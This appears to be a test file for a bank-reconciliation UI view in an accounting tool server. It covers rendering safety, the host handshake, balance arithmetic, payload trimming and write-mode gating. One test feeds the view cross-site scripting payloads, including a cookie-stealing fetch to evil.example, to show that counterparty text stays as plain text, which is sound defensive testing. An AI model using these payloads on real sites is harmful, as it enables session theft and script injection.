import { test } from "node:test";
import assert from "node:assert/strict";
import {
  buildReconcileData,
  renderTemplate,
  MAX_ROWS,
  RECONCILE_TEMPLATE_MIME,
  RECONCILE_TEMPLATE_URI,
} from "../dist/ui/reconciliation.js";
import { uiTools } from "../dist/tools/ui.js";
import { allTools, registeredTools } from "../dist/server.js";

/** A reconciliation shaped like the real one, with field names taken from live data. */
const sample = (overrides = {}) => ({
  bankAccountId: 1338,
  bankAccountName: "drift",
  bankCurrency: "NOK",
  tenantCurrency: "NOK",
  month: "2026-07",
  pendingTransactionCount: 2,
  pendingPostingCount: 1,
  pendingTransactions: [
    {
      id: 43063,
      amount: 112.02,
      currency: "NOK",
      transactionDate: "2026-07-31",
      description: "Utb. 2000014 Vippsnr 58977",
      paymentReference: null,
    },
    {
      id: 43064,
      amount: -250.5,
      currency: "NOK",
      transactionDate: "2026-07-30",
      description: "Europris Hommelvik",
      paymentReference: "KID0001",
    },
  ],
  pendingPostings: [
    {
      id: 118681,
      amount: -138.48,
      currencyAmount: -138.48,
      voucherNumber: "MV46-2026",
      postingDate: "2026-07-31",
      description: "Vipps-oppgjør",
    },
  ],
  ...overrides,
});

// ---------------------------------------------------------------------------
// A DOM small enough to read, and hostile in exactly one way: every HTML-parsing
// sink throws. That is the security property of this view — data reaches the page as
// text nodes, never as markup — enforced by making the unsafe path impossible rather
// than by grepping for it.
// ---------------------------------------------------------------------------

const FORBIDDEN = ["innerHTML", "outerHTML", "insertAdjacentHTML"];

function makeElement(tag, doc) {
  const node = {
    tagName: String(tag).toUpperCase(),
    className: "",
    children: [],
    dataset: {},
    listeners: {},
    hidden: false,
    checked: false,
    value: "",
    disabled: false,
    title: "",
    type: "",
    _text: "",
    get textContent() {
      // What a real node reports: own text plus every descendant's.
      return this._text + this.children.map((c) => c.textContent).join("");
    },
    set textContent(v) {
      this._text = v === null || v === undefined ? "" : String(v);
      // Detach, do not merely forget. The first version of this stub left every element
      // it had ever created in the document's list, so a second delivery reported six
      // checkboxes and double the selection sum — and would have reported the same if
      // the view had regressed to appending rows instead of replacing them.
      for (const child of this.children) child._attached = false;
      this.children = [];
    },
    appendChild(child) {
      child._attached = true;
      this.children.push(child);
      return child;
    },
    addEventListener(name, fn) {
      (this.listeners[name] ??= []).push(fn);
    },
    dispatch(name) {
      for (const fn of this.listeners[name] ?? []) fn({ target: this });
    },
    setAttribute(k, v) {
      this[k] = v;
    },
    getAttribute(k) {
      return this[k];
    },
    /** Every element in this subtree, self included. */
    all() {
      return [this, ...this.children.flatMap((c) => c.all())];
    },
  };
  for (const sink of FORBIDDEN) {
    Object.defineProperty(node, sink, {
      get() {
        throw new Error(`the view read ${sink}`);
      },
      set() {
        throw new Error(`the view wrote ${sink} — data must reach the DOM as text`);
      },
    });
  }
  if (doc) doc._created.push(node);
  return node;
}

/** Run the template's script against the stub DOM and return a handle to poke it. */
function mount() {
  const html = renderTemplate();
  const script = html.match(/<script>([\s\S]*)<\/script>/)?.[1];
  assert.ok(script, "the template must carry its script inline");

  const byId = new Map();
  const doc = {
    _created: [],
    getElementById(id) {
      if (!byId.has(id)) byId.set(id, makeElement("div", null));
      return byId.get(id);
    },
    createElement(tag) {
      return makeElement(tag, doc);
    },
    querySelectorAll(selector) {
      assert.equal(selector, "input[type=checkbox]", `unexpected selector: ${selector}`);
      return doc._created.filter((n) => n.tagName === "INPUT" && n.type === "checkbox" && n._attached);
    },
    write() {
      throw new Error("the view called document.write");
    },
  };
  const posted = [];
  const messageHandlers = [];
  const win = {
    parent: {
      postMessage(msg) {
        posted.push(msg);
      },
    },
    addEventListener(name, fn) {
      if (name === "message") messageHandlers.push(fn);
    },
  };

  // Strict mode, so the script cannot reach a global by assigning to an undeclared name.
  // (`eval` and `Function` cannot be shadowed as parameters in strict mode; the static
  // test asserts textually that neither appears.)
  const run = new Function("window", "document", `"use strict";${script}`);
  run(win, doc);

  return {
    posted,
    element: (id) => doc.getElementById(id),
    boxes: () => doc.querySelectorAll("input[type=checkbox]"),
    /** Send one raw frame from the host, for testing the handshake itself. */
    host(msg) {
      for (const fn of messageHandlers) fn({ data: msg });
    },
    /**
     * Deliver a tool result the way a CONFORMING host does: answer ui/initialize, wait for
     * ui/notifications/initialized, and only then send the data. A host is forbidden from
     * sending anything before that notification, so a view that never sends it renders
     * nothing — which is what this models.
     */
    deliver(structuredContent, { skipHandshake = false } = {}) {
      const post = (msg) => {
        for (const fn of messageHandlers) fn({ data: msg });
      };
      if (!skipHandshake) {
        const init = posted.find((m) => m.method === "ui/initialize");
        assert.ok(init, "the view must send ui/initialize");
        post({ jsonrpc: "2.0", id: init.id, result: { protocolVersion: "2026-01-26", hostContext: {} } });
        assert.ok(
          posted.some((m) => m.method === "ui/notifications/initialized"),
          "the host may not send data until the view says it is initialized",
        );
      }
      post({ jsonrpc: "2.0", method: "ui/notifications/tool-result", params: { structuredContent } });
    },
    check(kind, id) {
      const box = doc
        ._created.filter((n) => n.tagName === "INPUT" && n._attached)
        .find((n) => n.dataset.kind === kind && n.dataset.id === String(id));
      assert.ok(box, `no ${kind} checkbox for id ${id}`);
      box.checked = true;
      box.dispatch("change");
      return box;
    },
  };
}

const data = (overrides = {}) => ({
  ...buildReconcileData(sample(), {
    bankAccountId: 1338,
    month: "2026-07",
    tenantId: 2634,
    canMatch: true,
    writeMode: "full",
  }),
  ...overrides,
});

/** The arguments out of the call the view displays, which carries prose after the JSON. */
function argsOf(text) {
  return JSON.parse(text.slice(text.indexOf("{"), text.lastIndexOf("}") + 1));
}

// ---------------------------------------------------------------------------

// Descriptions, references and voucher numbers arrive from EHF documents and bank feeds,
// which is to say a counterparty writes them. The view renders inside the user's client,
// so if any of them could become markup it would be script injection with an external
// author — the one security property this file exists to hold.
test("counterparty text reaches the page as text, never as markup", () => {
  const payloads = [
    "</script><script>fetch('https://evil.example?c='+document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    '"><svg onload=alert(1)>',
    "'; alert(1); //",
    "<!--<script>alert(1)</script>-->",
    // Quote-free and angle-bracket-free, so HTML escaping would pass it through intact.
    // The old server-rendered version interpolated a value into JS source, where exactly
    // this payload was live code; there is no interpolation left for it to reach.
    "0,x:alert(1)",
  ];
  for (const payload of payloads) {
    const ui = mount();
    // Every field the API controls, not only the obviously textual ones.
    ui.deliver(
      data({
        bankAccountName: payload,
        month: payload,
        bankCurrency: payload,
        tenantCurrency: payload,
        transactions: [
          { id: 1, date: payload, amount: 1, currency: payload, description: payload, reference: payload },
        ],
        postings: [
          {
            id: 2,
            date: payload,
            amount: 1,
            currencyAmount: null,
            voucherNumber: payload,
            description: payload,
          },
        ],
      }),
    );
    // Reaching the DOM at all proves no HTML sink was used: the stub throws on every one.
    // And the payload must survive VERBATIM as text — escaping it would mean it had been
    // treated as markup somewhere.
    const title = ui.element("title").textContent;
    assert.ok(title.includes(payload), `the name was not rendered as text: ${payload}`);
    assert.ok(!title.includes("&lt;"), "text was HTML-escaped, so it was treated as markup");
    assert.ok(
      ui.element("tx-rows").textContent.includes(payload),
      `a transaction description was not rendered as text: ${payload}`,
    );
  }
});

test("the template is static, so there is no interpolation site at all", () => {
  const html = renderTemplate();
  // Two renders of a data-free template are identical by construction; asserting it keeps
  // a future "just pass the account id in" from reopening the injection class.
  assert.equal(html, renderTemplate());
  assert.equal(renderTemplate.length, 0, "renderTemplate must take no arguments");
  const script = html.match(/<script>([\s\S]*)<\/script>/)[1];
  for (const sink of [...FORBIDDEN, "document.write", "eval(", "new Function"]) {
    assert.ok(!script.includes(sink), `the script uses ${sink}`);
  }
});

// A host renders this under a strict CSP, so anything fetched would silently fail — and
// an accounting view should not phone anywhere regardless.
test("the view makes no external request", () => {
  const html = renderTemplate();
  assert.ok(!/https?:\/\//.test(html), "the view must not reference any external URL");
  assert.ok(!/<link|<img|@import|url\(/i.test(html), "no external stylesheet, image or font");
});

// The bug this test exists for: amounts were formatted nb-NO into an attribute and parsed
// back out, and nb-NO uses U+2212 MINUS SIGN, which the parser's character class dropped.
// Two transactions of +112,02 and −250,50 against a −138,48 posting balance exactly; the
// view reported a 224,04 discrepancy and offered a call that books one.
test("the running difference respects sign and øre", () => {
  const ui = mount();
  ui.deliver(data());
  ui.check("tx", 43063);
  ui.check("tx", 43064);
  ui.check("post", 118681);
  assert.equal(ui.element("diff").textContent, "balanced");
  assert.equal(ui.element("match").disabled, false);
  const call = ui.element("call").textContent;
  assert.match(call, /reai_match_bank_transactions/);
  const args = argsOf(call);
  assert.deepEqual(args.transactionIds, [43063, 43064]);
  assert.deepEqual(args.postingIds, [118681]);
  assert.equal(args.discrepancyAccount, undefined, "a balanced pair must not book a difference");
  // Carried through, or a caller who passed tenantId explicitly gets "No tenant selected"
  // from the very call this view told them to make.
  assert.equal(args.tenantId, 2634);
});

test("float noise does not become a discrepancy", () => {
  const ui = mount();
  ui.deliver(
    data({
      transactions: [
        { id: 1, date: "2026-07-01", amount: 0.1, currency: "NOK", description: "a", reference: "" },
        { id: 2, date: "2026-07-01", amount: 0.2, currency: "NOK", description: "b", reference: "" },
      ],
      postings: [
        { id: 3, date: "2026-07-01", amount: 0.3, currencyAmount: null, voucherNumber: "MV1", description: "c" },
      ],
      transactionTotal: 2,
      postingTotal: 1,
    }),
  );
  ui.check("tx", 1);
  ui.check("tx", 2);
  ui.check("post", 3);
  assert.equal(ui.element("diff").textContent, "balanced");
});

// Both id arrays have .min(1) in reai_match_bank_transactions, so a one-sided selection
// has no valid call — offering one would hand over something the schema rejects.
test("a one-sided selection offers no call and no button", () => {
  const ui = mount();
  ui.deliver(data());
  ui.check("tx", 43063);
  assert.equal(ui.element("match").disabled, true);
  assert.match(ui.element("call").textContent, /a match needs both/);
  assert.equal(ui.element("diff").textContent, "");
  assert.match(ui.element("count").textContent, /1 transaction\(s\), 0 posting\(s\)/);
});

// An unbalanced pair needs an account to book the difference to, and this view will not
// invent one — the old version put a placeholder string in the call it told you to run.
test("an unbalanced pair demands an account before it will offer the call", () => {
  const ui = mount();
  ui.deliver(data());
  ui.check("tx", 43063);
  ui.check("post", 118681);
  assert.match(ui.element("diff").textContent, /difference/);
  assert.equal(ui.element("account-wrap").hidden, false);
  assert.equal(ui.element("match").disabled, true, "no account yet, so nothing to offer");
  assert.ok(!ui.element("call").textContent.includes("SET_THE_ACCOUNT"));

  const account = ui.element("account");
  account.value = "7770";
  account.dispatch("input");
  assert.equal(ui.element("match").disabled, false);
  assert.equal(argsOf(ui.element("call").textContent).discrepancyAccount, "7770");
});

// Pressing the button is a request; the host mediates it and the server re-checks the
// write policy. It must carry the same arguments the view displayed.
test("the button asks the host to call the real tool", () => {
  const ui = mount();
  ui.deliver(data());
  ui.check("tx", 43063);
  ui.check("tx", 43064);
  ui.check("post", 118681);
  ui.element("match").dispatch("click");
  const call = ui.posted.find((m) => m.method === "tools/call");
  assert.ok(call, "the button must issue tools/call");
  assert.equal(call.params.name, "reai_match_bank_transactions");
  assert.deepEqual(call.params.arguments.transactionIds, [43063, 43064]);
  assert.equal(call.params.arguments.tenantId, 2634);

  // And it must refuse when the selection is not one the tool would accept.
  const half = mount();
  half.deliver(data());
  half.check("tx", 43063);
  half.element("match").dispatch("click");
  assert.equal(half.posted.filter((m) => m.method === "tools/call").length, 0);
});

test("the view announces itself to the host on load", () => {
  const ui = mount();
  const init = ui.posted.find((m) => m.method === "ui/initialize");
  assert.ok(init, "the view must send ui/initialize");
  assert.equal(init.jsonrpc, "2.0");
  assert.ok(init.id !== undefined, "a request needs an id");
});

// Two currencies cannot be subtracted. Which of the posting's two amounts is the bank
// figure is undocumented and unverifiable against reachable data, so the view shows both
// and states no difference rather than asserting a wrong one.
test("a foreign-currency account shows both figures and computes no difference", () => {
  const view = buildReconcileData(sample({ bankCurrency: "USD", tenantCurrency: "NOK" }), {
    bankAccountId: 1338,
    month: "2026-07",
    canMatch: true,
    writeMode: "full",
  });
  assert.equal(view.comparable, false);

  const ui = mount();
  ui.deliver(view);
  assert.match(ui.element("currency-warning").textContent, /USD.*NOK|NOK.*USD/);
  assert.equal(ui.element("currency-warning").hidden, false);
  ui.check("tx", 43063);
  ui.check("post", 118681);
  assert.match(ui.element("diff").textContent, /not computed/);
  assert.equal(ui.element("match").disabled, true, "must not offer a match it cannot check");
  // The exact call is still shown, so a user who has checked the conversion can run it.
  assert.match(ui.element("call").textContent, /reai_match_bank_transactions/);

  // And when the currencies agree — every case in reachable data — it computes normally.
  assert.equal(buildReconcileData(sample(), { bankAccountId: 1338, month: "2026-07" }).comparable, true);
});

// The failure that made this view worth building was a truncated column read as a
// complete one. A trimmed column must state the real total, in the view AND in the text.
test("a trimmed column states the real total", async () => {
  const many = Array.from({ length: 400 }, (_, i) => ({
    id: 1000 + i,
    amount: i,
    currency: "NOK",
    transactionDate: "2026-07-01",
    description: `row ${i}`,
  }));
  const view = buildReconcileData(sample({ pendingTransactions: many, pendingTransactionCount: 400 }), {
    bankAccountId: 1338,
    month: "2026-07",
  });
  assert.equal(view.transactions.length, MAX_ROWS);
  assert.equal(view.transactionTotal, 400, "the true total must survive the trim");

  const ui = mount();
  ui.deliver(view);
  assert.match(ui.element("tx-rows-trimmed").textContent, /Showing 120 of 400/);
  assert.equal(ui.element("post-rows-trimmed").textContent, "", "a complete column says nothing");

  const { text } = await callTool({ pendingTransactions: many, pendingTransactionCount: 400 });
  assert.match(text, /400 unmatched transaction\(s\)/);
  assert.match(text, /shows \d+ of 400/);
});

test("an empty period says so, and a missing one does not claim to be reconciled", async () => {
  const empty = mount();
  empty.deliver(
    buildReconcileData(
      sample({ pendingTransactions: [], pendingPostings: [], pendingTransactionCount: 0, pendingPostingCount: 0 }),
      { bankAccountId: 1338, month: "2026-07" },
    ),
  );
  assert.match(empty.element("tx-rows").textContent, /Nothing unmatched on the bank side/);
  assert.match(empty.element("post-rows").textContent, /Nothing unmatched on the ledger side/);

  const unreported = mount();
  unreported.deliver(data({ transactions: [], postings: [], transactionTotal: null, postingTotal: null }));
  assert.match(unreported.element("subtitle").textContent, /an unreported number of unmatched transaction/);
  assert.match(unreported.element("tx-rows").textContent, /not reported by the API/);
  assert.doesNotMatch(unreported.element("tx-rows").textContent, /Nothing unmatched/);

  const locked = mount();
  locked.deliver(buildReconcileData(sample({ closed: true }), { bankAccountId: 1338, month: "2026-07" }));
  assert.match(locked.element("locked").textContent, /closed or locked/);
  assert.equal(locked.element("locked").hidden, false);

  // Absence is not zero, and it has to be judged PER SIDE. Requiring both sides to be
  // absent before admitting ignorance meant a response mentioning only transactions was
  // announced as reconciled on the strength of a ledger side nobody had reported.
  const nothing = await callTool(undefined);
  assert.doesNotMatch(nothing.text, /is reconciled/);
  assert.match(nothing.text, /Neither side was reported/);
  assert.match(nothing.text, /manual/);

  // Zero transactions, and the ledger side simply not mentioned. The old code called this
  // a reconciled month.
  const half = await callTool({ pendingTransactionCount: 0, pendingTransactions: [] });
  assert.doesNotMatch(half.text, /is reconciled/);
  assert.match(half.text, /The ledger side was not reported/);
  assert.match(half.text, /an unreported number of unmatched posting\(s\)/);
  assert.equal(half.structured.postingTotal, null, "an unreported side must not become 0");

  // And the shape that sends an agent to the booking tool: rows on one side, silence on
  // the other, printed as "and 0 unmatched posting(s)".
  const oneSided = await callTool({
    pendingTransactionCount: 3,
    pendingTransactions: [
      { id: 1, amount: 5, currency: "NOK", transactionDate: "2026-07-01", description: "x" },
    ],
  });
  assert.doesNotMatch(oneSided.text, /0 unmatched posting/);
  assert.match(oneSided.text, /The ledger side was not reported/);

  // Counts without the list is the other half: the totals are real, the rows are not.
  const partial = await callTool({
    pendingTransactionCount: 12,
    pendingPostingCount: 7,
    pendingTransactions: null,
    pendingPostings: null,
  });
  assert.doesNotMatch(partial.text, /is reconciled/);
  assert.match(partial.text, /counts without the corresponding list/);

  // A count that contradicts its own list: believe the rows, and say so.
  const stale = await callTool({
    pendingTransactionCount: 0,
    pendingTransactions: [
      { id: 1, amount: 5, currency: "NOK", transactionDate: "2026-07-01", description: "x" },
    ],
    pendingPostingCount: 0,
    pendingPostings: [],
  });
  assert.doesNotMatch(stale.text, /is reconciled/);
  assert.match(stale.text, /count disagreed with the list/);
  assert.equal(stale.structured.transactionTotal, 1);

  // NOTHING UNMATCHED IS NOT RECONCILED, and this assertion used to say it was — it read
  // /this month is reconciled/ and so held the wrong claim green. Both sides being empty says
  // only that there is nothing to pair; a balance gap carried in from an earlier month leaves
  // exactly this state, and this branch REPLACES the whole note, so nothing else qualified it.
  const done = await callTool({ pendingTransactionCount: 0, pendingPostingCount: 0 });
  assert.match(done.text, /nothing to pair here/);
  assert.match(done.text, /not the same as reconciled/);
  assert.doesNotMatch(done.text, /this month is reconciled/);

  // With no balances in the response it must say it cannot answer, not that the books balance.
  assert.match(done.text, /Cannot answer/);

  // Given the balances, the computed answer is what appears — and the four balances reach the
  // TEXT surface, or a host without MCP Apps cannot check the claim. `pendingDiscrepancy` alone
  // was all it used to carry, which is specifically the field that does not answer this.
  const balanced = await callTool({
    pendingTransactionCount: 0,
    pendingPostingCount: 0,
    bankCurrency: "NOK",
    tenantCurrency: "NOK",
    bankLedgerOpeningBalance: 0,
    bankLedgerClosingBalance: 554.31,
    actualBankMonthStartBalance: 0,
    actualBankDisplayedBalance: 554.31,
    actualBankCurrentMonth: false,
  });
  assert.match(balanced.text, /bank matches the books/);
  assert.equal(JSON.parse(balanced.text.slice(balanced.text.indexOf("{"))).bankVsBooks, "matches");
  for (const field of [
    "bankLedgerOpeningBalance",
    "bankLedgerClosingBalance",
    "actualBankMonthStartBalance",
    "actualBankDisplayedBalance",
  ]) {
    assert.ok(balanced.text.includes(`"${field}"`), `${field} must reach the text surface`);
  }

  // And the case the old wording got wrong: nothing unmatched, but the openings differ, so the
  // month is NOT reconciled. This is unobservable on tenant 2634, which is why it is synthetic.
  const carriedIn = await callTool({
    pendingTransactionCount: 0,
    pendingPostingCount: 0,
    bankCurrency: "NOK",
    tenantCurrency: "NOK",
    bankLedgerOpeningBalance: 554.31,
    bankLedgerClosingBalance: 1002.36,
    actualBankMonthStartBalance: 654.31,
    actualBankDisplayedBalance: 1102.36,
    actualBankCurrentMonth: false,
  });
  assert.match(carriedIn.text, /bank shows more than the books by 100 NOK/);
  assert.match(carriedIn.text, /carried in/);
  assert.doesNotMatch(carriedIn.text, /matches the books/);
  assert.equal(JSON.parse(carriedIn.text.slice(carriedIn.text.indexOf("{"))).bankVsBooks, "differs");
});

/** Call the tool with a stubbed client and return its text plus structuredContent. */
async function callTool(data, args = {}, writeMode = "full") {
  const [tool] = uiTools;
  const result = await tool.handler(
    { bankAccountId: 1338, month: "2026-07", tenantId: 2634, ...args },
    {
      client: { request: async () => ({ data, status: 200 }), deepLink: () => "link" },
      config: { writeMode, tenantId: 2634 },
      session: {},
    },
  );
  return {
    text: result.content.find((c) => c.type === "text").text,
    structured: result.structuredContent,
    result,
  };
}

test("the tool is read-only, opt-in, and points the host at the view", async () => {
  assert.equal(uiTools.length, 1, "one view, deliberately");
  const [tool] = uiTools;
  assert.equal(tool.name, "reai_reconcile_ui");
  assert.equal(tool.risk, "read", "selecting must not be a write");
  assert.ok(!tool.transmits, "nothing here leaves the tenant");
  assert.equal(tool.meta.ui.resourceUri, RECONCILE_TEMPLATE_URI);
  assert.equal(RECONCILE_TEMPLATE_MIME, "text/html;profile=mcp-app");
  assert.ok(RECONCILE_TEMPLATE_URI.startsWith("ui://"));
  // Not in the default surface, but inside the set the repo-wide invariants iterate.
  assert.ok(!allTools.some((t) => t.name === "reai_reconcile_ui"), "must be off by default");
  assert.ok(registeredTools.some((t) => t.name === "reai_reconcile_ui"), "must not escape the guards");

  const { text, structured } = await callTool(sample());
  assert.match(text, /2 unmatched transaction\(s\) and 1 unmatched posting\(s\)/);
  assert.match(text, /reai_match_bank_transactions/);
  assert.equal(structured.transactions.length, 2);
  assert.equal(structured.tenantId, 2634);
});

// structuredContent is a rendering input, but several hosts also put it in front of the
// model, so it is a context cost. The template is fetched once; this travels per call.
test("the per-call payload stays within a budget", async () => {
  const many = Array.from({ length: 400 }, (_, i) => ({
    id: 1000 + i,
    amount: 1234.56,
    currency: "NOK",
    transactionDate: "2026-07-01",
    // A real Norwegian invoice line, at length, twice over.
    description: `Fakturanr 2026-${i} — leveranse av kontorrekvisita og forbruksmateriell til avdeling Hommelvik, jf. avtale`,
    paymentReference: `KID${String(i).padStart(12, "0")}`,
  }));
  const { text, structured } = await callTool({
    ...sample(),
    pendingTransactions: many,
    pendingTransactionCount: 400,
  });
  assert.ok(
    JSON.stringify(structured).length <= 12_000,
    `payload was ${JSON.stringify(structured).length} chars`,
  );
  // Trimming further than MAX_ROWS is allowed; hiding that it happened is not.
  assert.ok(structured.transactions.length < 400);
  assert.equal(structured.transactionTotal, 400);
  assert.match(text, new RegExp(`shows ${structured.transactions.length} of 400`));

  // The template itself is a fixed cost, paid once by hosts that fetch it.
  assert.ok(renderTemplate().length < 20_000, `template was ${renderTemplate().length} chars`);
});

// The handshake is the one thing that decides whether this works at all. The spec is
// explicit: "The Host MUST NOT send any request or notification to the View before it
// receives an `initialized` notification." A view that sends `ui/initialize` and then
// waits — which is what the first version did — sits on its placeholder forever, against
// a conforming host, with no error anywhere.
test("the view completes the MCP Apps handshake, in order", () => {
  const ui = mount();
  const init = ui.posted.find((m) => m.method === "ui/initialize");
  assert.ok(init, "ui/initialize must be a request, sent on load");
  assert.equal(init.jsonrpc, "2.0");
  assert.ok(init.id !== undefined, "a request needs an id");
  assert.deepEqual(init.params.appCapabilities.availableDisplayModes, ["inline", "fullscreen"]);
  assert.equal(init.params.protocolVersion, "2026-01-26");

  // Not before the host has answered.
  assert.ok(
    !ui.posted.some((m) => m.method === "ui/notifications/initialized"),
    "initialized must not be sent before the initialize response",
  );

  ui.deliver(data());
  const order = ui.posted.map((m) => m.method);
  assert.deepEqual(order.slice(0, 2), ["ui/initialize", "ui/notifications/initialized"]);
  assert.equal(
    ui.posted.filter((m) => m.method === "ui/notifications/initialized").length,
    1,
    "exactly one initialized notification",
  );
  // And the data landed.
  assert.match(ui.element("title").textContent, /drift/);
});

test("an initialize error still ends initialization rather than hanging", () => {
  const ui = mount();
  const init = ui.posted.find((m) => m.method === "ui/initialize");
  ui.host({ jsonrpc: "2.0", id: init.id, error: { code: -32602, message: "unknown capability" } });
  assert.ok(
    ui.posted.some((m) => m.method === "ui/notifications/initialized"),
    "a host that rejects the request has still spoken; staying silent guarantees no data",
  );
});

// Matching is irreversible, so in the default write mode the tool is not registered at
// all — a button posting tools/call for it fails with "unknown tool", never reaching the
// write policy's explanation.
test("the button is disabled when the server cannot match", async () => {
  const ui = mount();
  ui.deliver(data({ canMatch: false, writeMode: "reversible" }));
  ui.check("tx", 43063);
  ui.check("tx", 43064);
  ui.check("post", 118681);
  assert.equal(ui.element("match").disabled, true);
  assert.match(ui.element("call").textContent, /write mode 'reversible'/);
  assert.match(ui.element("call").textContent, /REAI_WRITE_MODE=full/);
  // The exact call is still shown, and the running difference still computed — the view is
  // useful for deciding even where it cannot act.
  assert.match(ui.element("call").textContent, /reai_match_bank_transactions/);
  assert.equal(ui.element("diff").textContent, "balanced");
  ui.element("match").dispatch("click");
  assert.equal(ui.posted.filter((m) => m.method === "tools/call").length, 0);

  // And the text answer says so, keyed off the real write mode.
  const blocked = await callTool(sample(), {}, "reversible");
  assert.match(blocked.text, /Matching is not available in write mode 'reversible'/);
  assert.equal(blocked.structured.canMatch, false);
  const allowed = await callTool(sample(), {}, "full");
  assert.doesNotMatch(allowed.text, /not available in write mode/);
  assert.equal(allowed.structured.canMatch, true);
});

// The first fix for the currency problem labelled BOTH posting figures with the same
// currency code, so whichever figure was which, one label was false — while the warning
// above it said the two were shown in different currencies.
test("cross-currency postings are labelled by field, not by a guessed currency", () => {
  const view = buildReconcileData(
    sample({
      bankCurrency: "USD",
      tenantCurrency: "NOK",
      pendingPostings: [
        {
          id: 5,
          amount: 1050,
          currencyAmount: 100,
          voucherNumber: "MV1-2026",
          postingDate: "2026-07-01",
          description: "levering",
        },
      ],
      pendingPostingCount: 1,
    }),
    { bankAccountId: 1338, month: "2026-07", canMatch: true, writeMode: "full" },
  );
  const ui = mount();
  ui.deliver(view);
  const rows = ui.element("post-rows").textContent;
  assert.match(rows, /1\u00a0050,00 \(amount\)/);
  assert.match(rows, /100,00 \(currencyAmount\)/);
  // Neither figure may carry a currency code, because which one is the bank's is unknown.
  assert.doesNotMatch(rows, /NOK/);
  assert.doesNotMatch(rows, /USD/);
  // The bank column, whose currency IS known, still shows it.
  assert.match(ui.element("tx-rows").textContent, /USD/);
});

// The expensive column pays for the budget, not the cheap one. Trimming by row COUNT meant
// a busy bank side kept taking rows off a short ledger side that would have fitted whole.
//
// Note this can no longer be provoked by a single monstrous row: every description is
// clamped to 120 characters on the way out, so per-row cost is bounded and only the number
// of rows can overflow the budget. Both guards are deliberate — the clamp bounds the row,
// the cost rule decides which column loses.
test("the budget trims the expensive column, not the cheap one", async () => {
  const { structured, text } = await callTool({
    ...sample(),
    pendingTransactionCount: 400,
    pendingTransactions: Array.from({ length: 400 }, (_, i) => ({
      id: 1000 + i,
      amount: 1234.56,
      currency: "NOK",
      transactionDate: "2026-07-01",
      description: `Fakturanr 2026-${i} — leveranse av kontorrekvisita til avdeling Hommelvik, jf. avtale`,
      paymentReference: `KID${String(i).padStart(12, "0")}`,
    })),
    pendingPostingCount: 3,
    pendingPostings: Array.from({ length: 3 }, (_, i) => ({
      id: 100 + i,
      amount: i,
      currencyAmount: i,
      voucherNumber: `MV${i}`,
      postingDate: "2026-07-01",
      description: "short",
    })),
  });
  assert.equal(structured.postings.length, 3, "the cheap column must survive intact");
  assert.ok(structured.transactions.length < 120, "the expensive one absorbs the trim");
  assert.ok(JSON.stringify(structured).length <= 12_000);
  // And the note agrees with the payload, whatever the trim did.
  assert.match(text, new RegExp(`shows ${structured.transactions.length} of 400 transaction`));
  assert.match(text, /3 of 3 posting/);
});

// A single monstrous row is bounded before the budget ever sees it.
test("a row description is clamped, so one row cannot dominate", async () => {
  const { structured } = await callTool({
    ...sample(),
    pendingTransactionCount: 1,
    pendingTransactions: [
      { id: 1, amount: 5, currency: "NOK", transactionDate: "2026-07-01", description: "x".repeat(20_000) },
    ],
  });
  assert.equal(structured.transactions.length, 1, "the row survives; only its text is cut");
  assert.ok(structured.transactions[0].description.length <= 120);
  assert.ok(structured.transactions[0].description.endsWith("…"));
});

// A scalar the API controls must not be the one unbounded path to the model.
test("a pathological scalar cannot blow the payload budget", async () => {
  const { structured } = await callTool({ ...sample(), bankAccountName: "n".repeat(30_000) });
  assert.ok(
    JSON.stringify(structured).length <= 12_000,
    `payload was ${JSON.stringify(structured).length} chars`,
  );
  assert.ok(structured.bankAccountName.length <= 120);
  assert.ok(structured.bankAccountName.endsWith("…"), "and it says it was cut");
});

test("the UI tool reaches a client only when the operator enabled it", async () => {
  // `registeredTools` deliberately includes it — that list is every tool this server can ever
  // register, which is what the repo-wide invariants sweep. What decides whether a client SEES it is
  // the visibility pipeline, and nothing asserted that. A README-engineering pass noticed the count
  // discrepancy (146 registered against 145 in the toolset arithmetic) and read it as a possible
  // defect; it is not, but the gate that makes it not-a-defect had no test.
  const { visibleTools } = await import("../dist/server.js");
  const base = { toolsets: [], writeMode: "full", allowExternalSend: true };
  const off = visibleTools({ ...base, enableUi: false }).visible.map((t) => t.name);
  const on = visibleTools({ ...base, enableUi: true }).visible.map((t) => t.name);
  assert.ok(!off.includes("reai_reconcile_ui"), "the UI tool must not appear by default");
  assert.ok(on.includes("reai_reconcile_ui"), "REAI_ENABLE_UI must actually enable it");
  assert.deepEqual(
    on.filter((n) => n !== "reai_reconcile_ui"),
    off,
    "enabling the UI changed the rest of the tool list",
  );
});

test("the visibility pipeline withholds by write mode and by external send", async () => {
  // The whole safety surface in one matrix. It was inline in buildServer, so the only thing exercising
  // it was the live smoke suites — one configuration each, and needing a real token to run at all.
  const { visibleTools } = await import("../dist/server.js");
  const at = (writeMode, allowExternalSend) =>
    visibleTools({ toolsets: [], enableUi: false, writeMode, allowExternalSend }).visible;

  const readOnly = at("read-only", false);
  assert.ok(readOnly.length > 0, "read-only must still expose the reads");
  assert.deepEqual(
    readOnly.filter((t) => t.risk !== "read").map((t) => t.name),
    [],
    "read-only exposed a tool that writes",
  );

  const reversible = at("reversible", false);
  assert.deepEqual(
    reversible.filter((t) => t.risk === "irreversible").map((t) => t.name),
    [],
    "the default mode exposed an irreversible tool",
  );
  assert.ok(reversible.length > readOnly.length, "reversible must add the reversible writes");

  // A transmitting tool stays hidden even in full mode: the two axes are independent, and this is the
  // one that cannot be undone. Asserted in both directions so the switch is proven to do something.
  const fullNoSend = at("full", false);
  assert.deepEqual(
    fullNoSend.filter((t) => t.transmits === true).map((t) => t.name),
    [],
    "full mode leaked a transmitting tool with external send off",
  );
  const fullWithSend = at("full", true);
  const transmitting = fullWithSend.filter((t) => t.transmits === true).map((t) => t.name);
  assert.ok(transmitting.length > 0, "enabling external send must actually expose the senders");
  assert.deepEqual(
    fullWithSend.filter((t) => t.transmits !== true).map((t) => t.name),
    fullNoSend.map((t) => t.name),
    "enabling external send changed something other than the transmitting tools",
  );

  // And the count reported to the model is measured against the toolset selection, not against the
  // selection plus the opt-in UI tool — the arithmetic a comment in server.ts warns about.
  const withUi = visibleTools({ toolsets: [], enableUi: true, writeMode: "full", allowExternalSend: true });
  const withoutUi = visibleTools({ toolsets: [], enableUi: false, writeMode: "full", allowExternalSend: true });
  assert.equal(withUi.byToolset.length, withoutUi.byToolset.length, "the UI tool must not enter the toolset count");
});
